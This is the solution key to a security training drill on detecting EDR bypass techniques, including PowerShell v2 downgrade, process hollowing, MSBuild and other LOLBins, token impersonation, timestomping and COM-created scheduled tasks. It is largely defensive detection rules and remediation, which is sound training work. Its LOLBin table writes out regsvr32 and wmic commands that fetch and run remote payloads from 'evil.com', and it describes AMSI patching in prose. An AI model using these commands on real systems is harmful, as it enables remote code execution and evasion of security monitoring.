# Drill 02 (Advanced) Solution: EDR Bypass Detection Techniques

---

## Q1 — PowerShell Downgrade Detection (4 points)

**a) Why PowerShell v2 is a security problem:**

PowerShell version 2 was released in 2009 and lacks ALL modern security features:

* **No Script Block Logging** (Event 4104) — code executes without being logged
* **No Module Logging** (Event 4103)
* **No AMSI** (Antimalware Scan Interface) — EDR/AV cannot inspect the script content before execution
* **No Constrained Language Mode** — no restrictions on allowed operations
* **No `#Requires -Version 5.1`** enforcement possible

**Windows versions with v2 available by default (as a Windows Feature):**

* Windows 7, 8, 8.1, 10, 11 all ship with PowerShell v2 as an optional Windows feature
* It must be manually removed via: `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2`
* Many organizations have never removed it

**b) Two detection approaches:**

**Approach 1: Process Command Line Detection (Sysmon Event 1)**

```text
RULE: PowerShell Version Downgrade Attempt
Condition:
  Image = "*\powershell.exe"
  AND CommandLine CONTAINS "-version 2"
     OR CommandLine CONTAINS "-v 2"
     OR CommandLine CONTAINS "-Version 2.0"
Alert: Critical
Notes: Any use of -version 2 flag is suspicious; no legitimate modern use case
```

**Approach 2: ETW / Version Telemetry**

```text
RULE: PowerShell EngineVersion 2.0 in Script Block
Data Source: Microsoft-Windows-PowerShell/Operational (Event 400 — Engine Lifecycle)
Condition:
  EventID = 400  (PowerShell Engine Started)
  AND EngineVersion STARTS WITH "2."
Alert: High
Notes: Event 400 captures engine startup even when Script Block Logging
       is disabled, and includes the engine version
```

**c) Remediation:**

```powershell
# Remove PowerShell v2 entirely (run as Administrator)
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

# Verify removal
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
# Status should show: Disabled
```

Group Policy: Deploy via GPO to all workstations in the domain.

**d) Alternative technique if v2 is blocked:**

* **AMSI bypass in current PowerShell version:** Attackers can patch the AMSI interface in memory to make it always return "clean" results. Common bypass uses reflection to overwrite the `AmsiScanBuffer` function.
* **COM scripting (VBScript/JScript):** WScript/CScript do not use AMSI by default on older configurations.
* **C# compilation via Add-Type:** Execute C# code within PowerShell that does not go through PowerShell's AMSI path.

---

## Q2 — Direct Syscall / Process Hollowing Detection (4 points)

**a) Why direct syscalls bypass user-mode hooks:**

**How EDR hooking works:**

1. EDR installs a kernel driver at boot
1. The driver patches (hooks) key functions in `ntdll.dll` in every process's memory space
1. When code calls `NtAllocateVirtualMemory()`, it goes through the EDR's patched version first, which logs the call, then passes it to the real kernel

**How syscalls bypass this:**

* Windows APIs all ultimately invoke kernel functions via a `syscall` instruction with a **syscall number** (SSN) specific to each function
* Instead of calling `ntdll.NtAllocateVirtualMemory()` (which is hooked), the attacker's code calls `syscall` directly with the SSN for `NtAllocateVirtualMemory`
* This completely bypasses `ntdll.dll` — the hook is never executed
* The EDR driver in the kernel can still potentially see the syscall via ETW, but many EDR implementations rely primarily on user-mode hooks

**b) Alternative detection mechanisms (two or more):**

1. **Kernel ETW (Event Tracing for Windows):** Microsoft provides ETW providers at the kernel level that log syscall events. Tools like Microsoft Defender for Endpoint (MDE) use kernel-level ETW rather than user-mode hooks, making them more resistant to this bypass. Detection: kernel-level audit of memory allocation + write + protect sequences.

1. **Behavioral anomaly on the target process:** After hollowing:
   * The legitimate `svchost.exe` will have a memory region marked as RWX (Read-Write-Execute) or an executable region without a corresponding file on disk
   * `svchost.exe` may make unusual network connections, spawn unusual children, or access unusual files
   * Monitoring these behaviors (process activity anomaly) catches the hollowed process regardless of how it was created

1. **Sysmon Event 25 (ProcessTampering) on kernel-level:** If the EDR has kernel-level callbacks (not just user hooks), tampering detection can still fire even with direct syscalls.

1. **Memory scanning:** Some EDR products periodically scan process memory for known shellcode patterns (not just on-access but scheduled). Even without hook events, a memory scan would find the shellcode.

**c) Sysmon Event 25 — why it didn't fire:**

Sysmon Event 25 (ProcessTampering) specifically detects **changes to a process image** — it monitors when the executable image backing a process's memory is modified or replaced.
It does this through a kernel callback mechanism.

In this case, it didn't fire because:

1. The red team used direct syscalls to manipulate memory **without modifying the process image file itself** — they allocated new memory and wrote shellcode there, but the original `svchost.exe` binary on disk was unchanged
1. Event 25 detects image (file) modification, not arbitrary memory writes to process space

**What Event 25 actually detects:**

* Changes to `\BaseNamedObjects\...` mappings
* Process image being replaced in memory (classic process hollowing that replaces the PE header)
* Some implementations of process doppelganging

**d) Behavioral anomaly detection for hollowed processes:**

```text
HYPOTHESIS: A hollowed svchost.exe will exhibit behaviors inconsistent
            with its expected operational profile.

RULE: Anomalous Process Behavior Post-Hollowing
Trigger: Any combination of unusual activity from a known system process:
  - svchost.exe making DNS queries to non-Microsoft domains
  - svchost.exe creating child processes that aren't known svchost children
  - svchost.exe opening handles to LSASS
  - svchost.exe writing files to user directories (AppData, Temp)
  - svchost.exe with a parent other than services.exe

Detection:
  Process baseline modeling — establish what svchost.exe normally does
  (which network connections, which children, which registry accesses)
  and alert on deviations.

Alert Level: High for single anomaly; Critical for 2+ anomalies on same PID
```

---

## Q3 — MSBuild LOLBin Detection (3 points)

**a) Broader LOLBin problem and alternatives:**

MSBuild represents the class of **trusted execution proxies** — signed Microsoft binaries that can execute arbitrary code through legitimate-looking file inputs.

Three other LOLBins that execute arbitrary code from a file:

| LOLBin | Mechanism | Example |
|--------|-----------|---------|
| `regsvr32.exe` | Register COM DLL; can execute remote scriptlet (Squiblydoo) | `regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll` |
| `installutil.exe` | .NET assembly installer; runs code in `[RunInstallerAttribute]` decorated classes | `installutil.exe /logfile= /logtoconsole=false payload.exe` |
| `msbuild.exe` (v3.5) | Older .NET framework version of MSBuild also works | `C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe payload.proj` |
| `csc.exe` | C# compiler; can compile and run C# code inline | `csc.exe payload.cs && payload.exe` |
| `wmic.exe` | WMI; can execute processes, run XSL transforms | `wmic process get brief /format:"http://evil.com/payload.xsl"` |

**b) Why EDR exclusion of MSBuild is dangerous:**

Excluding `MSBuild.exe` from behavioral monitoring creates a **detection blind spot** — the attacker knows if they use MSBuild, they can operate freely.

The proper approach:

1. **Don't exclude the binary — exclude specific expected behaviors.** MSBuild on a build server should: run as the build service account, process project files from the source code directory, not make outbound internet connections, not create processes outside the build tools directory.
1. **Alert on deviations from normal, not on all MSBuild activity.** A MSBuild instance making a network connection to 185.x.x.x should alert regardless of noise level.
1. **Restrict where MSBuild can be called from** using AppLocker or WDAC policies: only allow MSBuild.exe to be invoked from CI/CD pipeline processes, not from PowerShell or cmd.exe.

**c) Detection rule for build servers:**

```text
RULE: MSBuild Executing Suspicious Behavior
Data Source: Sysmon Event 1 (children), Event 3 (network), Event 11 (file create)

Condition A (Always alert on build server):
  Image = "*\MSBuild.exe"
  AND (
    ParentImage NOT IN (known_CI_CD_tools)  -- e.g., jenkins.exe, TeamCity, Azure Pipelines agent
    OR NetworkConnect WHERE DestinationIP is external
    OR FileCreate WHERE TargetFilename CONTAINS ".exe" AND path NOT IN build_output_dirs
    OR ProcessCreate WHERE NewProcess is NOT a known compiler tool
  )

Condition B (Flag for review even from CI/CD):
  Image = "*\MSBuild.exe"
  AND SourceFile ENDS WITH ".csproj"
  AND SourceFile.Path NOT IN (source_code_repository_paths)

Alert: Medium-High
Notes: Fine-tune based on specific build pipeline. Initial deployment will
       generate false positives — tune over 2 weeks.
```

---

## Q4 — Token Impersonation Detection (4 points)

**a) Windows token impersonation mechanism:**

Every process in Windows has an **access token** — a data structure containing the security context (user SID, group memberships, privileges).
When a thread is created, it inherits the process token.

**Impersonation tokens** allow a thread to temporarily assume a different security context.
Key aspects:

* **No network authentication occurs** — the attacker isn't presenting credentials to a domain controller
* The attacker finds an existing token in memory (via `NtQuerySystemInformation` or OpenProcess/OpenToken), duplicates it, and assigns it to their thread
* From that point, all access checks are performed against the impersonated token
* **No 4624 event** is generated because no logon occurred — the session already existed

**b) What events WOULD be generated:**

**Sysmon Event 10 (ProcessAccess):** To steal a token from another process, the attacker must call `OpenProcess()` on the target process with sufficient access rights.
This generates:

```text
type: ProcessAccess
SourceImage: compromised_process.exe
TargetImage: [process with the token — e.g., backup.exe running as domainadmin]
GrantedAccess: 0x1400  (PROCESS_QUERY_INFORMATION + PROCESS_DUP_HANDLE)
```

The anomalous field: a low-privilege service process (`NETWORK SERVICE`) opening handles to user-process tokens.
The access mask `0x1400` (for handle duplication) from an unexpected source process is the indicator.

**c) Behavioral detection rule for token impersonation:**

```text
RULE: Suspicious Token/Handle Access (Impersonation Preparation)
Data Source: Sysmon Event 10 (ProcessAccess)
Condition:
  SourceImage is a service process (running as NETWORK SERVICE, LOCAL SERVICE, IIS AppPool)
  AND GrantedAccess CONTAINS 0x1400 (PROCESS_DUP_HANDLE)
     OR GrantedAccess CONTAINS 0x400  (PROCESS_QUERY_INFORMATION)
  AND TargetImage is a user-context process (not another service process)
Alert: High

Also:
RULE: Service Account Suddenly Performing Admin Actions
Data Source: Windows Security Event 4674 (Privileged Service Called)
             + Command execution events (4688)
Condition:
  Process running as NETWORK SERVICE OR LOCAL SERVICE
  AND executing commands consistent with admin reconnaissance
  (net group, whoami /priv, dir \\server\C$, etc.)
```

**d) Required privilege for impersonation:**

**`SeImpersonatePrivilege`** — allows a thread to impersonate a security context.
This privilege is automatically granted to:

* Service accounts (NETWORK SERVICE, LOCAL SERVICE, IIS AppPool accounts)
* Local administrators
* Certain COM server processes

This is why exploiting a service running as a service account gives immediate impersonation capability — service accounts already have the privilege by design.

**How attackers obtain this:**

* Compromise any service account (web shells in IIS, SQL Server xp_cmdshell, etc.)
* Exploit a local privilege escalation that gives a service account context
* Famous exploits that abuse this: PrintSpoofer, JuicyPotato, RoguePotato (all called "potato" attacks)

---

## Q5 — Timestomping Detection (3 points)

**a) Sysmon Event 2 purpose:**

Sysmon Event 2 (FileCreationTimeChanged) fires whenever a process modifies a file's **$STANDARD_INFORMATION** (SI) attribute's creation timestamp using the Windows API (`SetFileTime()`).
It captures:

* Which process changed the timestamp
* The original file creation time
* The new (modified/spoofed) time

This detects the most common timestomping technique — using the Windows API to set file times.

**b) Forensic artifact that reveals true creation time after timestomping:**

**NTFS $FILE_NAME (FN) attribute:** NTFS maintains two timestamp sets for each file:

1. **$STANDARD_INFORMATION (SI)** — easily modified via Windows API (what timestomping changes)
1. **$FILE_NAME (FN)** — stored in the NTFS Master File Table (MFT) directory entry; can ONLY be modified by the NTFS kernel driver, not by the standard Windows API

Timestomping tools like PowerShell's `Set-ItemProperty` and the `touch` equivalent only modify the SI timestamps.
The FN timestamps remain accurate.

**Tool:** `MFTECmd.exe` (DFIR) or `Plaso` can extract FN timestamps from the MFT.

Detection at forensic time:

```text
If SI.CreationTime << FN.CreationTime (SI shows much older date than FN),
this is a strong indicator of timestomping.
```

**c) Timestomping detection rule:**

```text
RULE: Timestamp Manipulation Detected
Data Source: Sysmon Event 2 (FileCreationTimeChanged)
Condition:
  ProcessImage NOT IN (known_legitimate_timestampers:
    robocopy.exe, xcopy.exe, msdeploy.exe, backup_tools)
  AND (
    NewCreationUtcTime before 2000-01-01   -- Obviously fake date
    OR NewCreationUtcTime older by > 1 year than PreviousCreationUtcTime
  )

Enhanced Rule:
  Also alert when:
  NewCreationUtcTime < (system_install_date OR earliest_known_file_on_volume)
  Because: No legitimate file should predate the OS installation

Alert: Medium
Notes: Low false positive rate; legitimate reasons to change timestamps
       are rare and from known applications
```

---

## Q6 — COM-Based Scheduled Task Detection (3 points)

**a) Data sources for COM-based task creation:**

1. **ETW Provider: Microsoft-Windows-TaskScheduler** — this ETW channel logs task registration events regardless of HOW the task was created (via schtasks.exe, PowerShell, or direct COM API). Event ID 106 (Task Registered) fires for all task creation methods.

1. **Windows Security Event 4698** — also fires for all task creation methods (it's a kernel audit event, not a process monitor). This catches COM-based creation just as reliably as schtasks.exe-based.

1. **Sysmon Event 12/13 (RegistryEvent):** Task creation writes metadata to the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\`.

**b) File system artifact confirming task creation:**

Regardless of creation method, all scheduled tasks create an XML file in:

```text
C:\Windows\System32\Tasks\[TaskPath\TaskName]
```

Example: A task at `\Microsoft\Windows\EdgeUpdate\ScheduledUpdate` creates:

```text
C:\Windows\System32\Tasks\Microsoft\Windows\EdgeUpdate\ScheduledUpdate
```

**Forensic check:**

```powershell
# List all task XML files modified in last 24 hours
Get-ChildItem "C:\Windows\System32\Tasks" -Recurse |
  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } |
  Select-Object FullName, LastWriteTime
```

**c) Detection approach not dependent on schtasks.exe:**

```text
RULE: New Scheduled Task Created (Method-Independent)
Data Sources (prioritized):

  1. Windows Security Event 4698 (Task Created) — most reliable

  2. ETW: Microsoft-Windows-TaskScheduler Event 106
  3. Sysmon Event 11 (FileCreate) for C:\Windows\System32\Tasks\*

Detection logic:
  On Event 4698 OR Task file creation in C:\Windows\System32\Tasks\:
    Examine TaskContent/Task XML for:
      - Action pointing to Temp, AppData, ProgramData, or user home dirs
      - Action using encoded PowerShell (-enc, -EncodedCommand)
      - Action running cmd.exe or wscript.exe with suspicious args
      - TaskName mimicking known legitimate tasks but with slight differences
      - RunAs = SYSTEM for tasks created by non-SYSTEM users

Alert: High (any match to above conditions)
       Medium (new task not in approved task baseline)
```

---

## Q7 — Architecture Recommendation (5 points)

**a) Detection Coverage Matrix:**

| Technique | Current Gap | Recommended Detection | Data Source Required | Priority |
|-----------|-------------|----------------------|---------------------|----------|
| PS Downgrade | Script Block Logging bypassed | Alert on `powershell -version 2` cmdline; Block v2 via GPO | Sysmon Event 1 cmdline, ETW Event 400 | **Critical** — simple to fix |
| Direct Syscalls / Hollowing | User-mode hook bypassed | Kernel ETW (requires EDR with kernel-level monitoring); behavioral anomaly on hollowed process | Kernel ETW, EDR behavioral rules | **High** — requires EDR upgrade or tuning |
| MSBuild LOLBin | EDR exclusion | Re-enable monitoring with contextual rules (known-good parent, network block, output path) | Sysmon Event 1 (parent, network), WDAC policy | **High** — configuration fix |
| Token Impersonation | No auth event generated | Monitor ProcessAccess for handle theft pattern; service accounts doing admin recon | Sysmon Event 10, Event 4688 | **High** — requires new rules |
| Timestomping | Forensic timeline defeated | Sysmon Event 2 (FileCreationTimeChanged); FN attribute forensic comparison | Sysmon Event 2, DFIR MFT analysis | **Medium** — detection rule addition |
| COM Scheduled Tasks | schtasks.exe-dependent rule | Switch to Event 4698 + Task XML file monitoring | Windows Security Event 4698, Sysmon Event 11 | **Critical** — complete rule rewrite needed |

**b) Executive Summary for CISO:**

"Having an EDR product deployed across our endpoints is an important security control, but it does not mean we are fully protected.
As our red team demonstrated, six different techniques allowed them to operate for over four hours without triggering any alerts.

The core issues are: some monitoring depends on features that attackers can explicitly disable (PowerShell logging), some depends on interception points that skilled attackers can bypass (user-mode API hooks), and some rules were configured too narrowly — catching only specific tools (schtasks.exe) rather than the underlying actions those tools perform.
Additionally, operational convenience decisions like excluding build tools from monitoring created targeted blind spots that attackers can exploit.

The fixes are achievable and do not require replacing our EDR: we need to remove legacy features attackers exploit (PowerShell v2), move to kernel-level detection methods, rewrite detection rules to focus on outcomes rather than specific tools, and never exclude a binary from monitoring entirely — instead, define what it is and is not allowed to do.
The investment in detection engineering is significantly lower than the cost of a breach like the one our red team demonstrated in just four hours."
